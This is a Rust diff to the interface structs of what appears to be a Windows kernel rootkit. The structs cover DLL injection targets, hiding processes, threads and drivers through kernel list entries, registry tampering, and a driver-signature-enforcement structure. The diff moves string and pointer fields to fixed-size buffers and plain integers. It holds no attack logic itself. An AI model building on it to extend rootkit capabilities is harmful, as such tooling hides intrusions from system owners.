@@ -34,13 +34,13 @@ pub struct EnumerateInfoInput {
 
 /// Represents the target process and path for a DLL or code injection.
 #[repr(C)]
-#[derive(Debug)]
+#[derive(Debug, Clone, Copy)]
 pub struct TargetInjection {
     /// The process identifier (PID) of the target process where the injection will occur.
     pub pid: usize,
 
     /// The path to the file or resource (typically a DLL) to be injected into the process.
-    pub path: alloc::string::String,
+    pub path: [u16; 256],
 }
 
 /// Represents information about a network or communication port.
@@ -62,24 +62,32 @@ pub struct TargetPort {
 
 /// Represents the target registry key and value for operations.
 #[repr(C)]
-#[derive(Debug, Default)]
+#[derive(Debug, Clone, Copy)]
 pub struct TargetRegistry {
-    /// The registry key, represented as a dynamically allocated string.
-    /// This is typically the path to a specific registry key (e.g., `HKEY_LOCAL_MACHINE\Software\...`).
-    pub key: alloc::string::String,
+    /// The registry key, represented as a fixed-size UTF-16 buffer.
+    pub key: [u16; 256],
 
-    /// The value associated with the registry key, represented as a dynamically allocated string.
-    /// This could be a string value stored under the specified registry key.
-    pub value: alloc::string::String,
+    /// The value associated with the registry key, represented as a fixed-size UTF-16 buffer.
+    pub value: [u16; 256],
 
     /// A boolean value indicating whether the operation on the registry key should be enabled (`true`)
     /// or disabled (`false`).
     pub enable: bool,
 }
 
+impl Default for TargetRegistry {
+    fn default() -> Self {
+        Self {
+            key: [0u16; 256],
+            value: [0u16; 256],
+            enable: false,
+        }
+    }
+}
+
 /// Represents the target thread for operations like manipulation or monitoring.
 #[repr(C)]
-#[derive(Debug, Default)]
+#[derive(Debug, Default, Clone, Copy)]
 pub struct TargetThread {
     /// The thread identifier (TID).
     pub tid: usize,
@@ -87,8 +95,8 @@ pub struct TargetThread {
     /// A boolean value indicating whether the thread is hidden or unhidden.
     pub enable: bool,
 
-    /// A pointer to the `LIST_ENTRY` structure.s
-    pub list_entry: AtomicPtr<LIST_ENTRY>,
+    /// A pointer to the `LIST_ENTRY` structure.
+    pub list_entry: usize,
 
     /// The options to control how the enumeration should behave.
     pub options: Options,
@@ -96,7 +104,7 @@ pub struct TargetThread {
 
 /// Stores information about a target process for operations such as termination or manipulation.
 #[repr(C)]
-#[derive(Debug, Default)]
+#[derive(Debug, Default, Clone, Copy)]
 pub struct TargetProcess {
     /// The process identifier (PID).
     pub pid: usize,
@@ -111,7 +119,7 @@ pub struct TargetProcess {
     pub tp: usize,
 
     /// A pointer to the `LIST_ENTRY` structure.
-    pub list_entry: AtomicPtr<LIST_ENTRY>,
+    pub list_entry: usize,
 
     /// The options to control how the enumeration should behave.
     pub options: Options,
@@ -133,13 +141,13 @@ pub struct ModuleInfo {
 
 /// Represents the target module within a specific process for operations like enumeration or manipulation.
 #[repr(C)]
-#[derive(Debug)]
+#[derive(Debug, Clone, Copy)]
 pub struct TargetModule {
     /// The process identifier (PID).
     pub pid: usize,
 
     /// The name of the target module.
-    pub module_name: alloc::string::String,
+    pub module_name: [u16; 256],
 }
 
 /// Callback Information for Enumeration.
@@ -207,17 +215,17 @@ pub struct DSE {
 
 /// Represents the target driver for operations like hiding or revealing it.
 #[repr(C)]
-#[derive(Debug, Default)]
+#[derive(Debug, Default, Clone, Copy)]
 pub struct TargetDriver {
-    /// The name of the target driver as a dynamic string.
-    pub name: alloc::string::String,
+    /// The name of the target driver as a fixed-size UTF-16 buffer.
+    pub name: [u16; 256],
 
     /// A boolean flag that indicates whether the driver is enabled or hidden.
     pub enable: bool,
 
     /// A pointer to the `LIST_ENTRY` structure.
-    pub list_entry: AtomicPtr<LIST_ENTRY>,
+    pub list_entry: usize,
 
     /// A pointer to the `LDR_DATA_TABLE_ENTRY` structure.
-    pub driver_entry: AtomicPtr<LDR_DATA_TABLE_ENTRY>,
+    pub driver_entry: usize,
 }
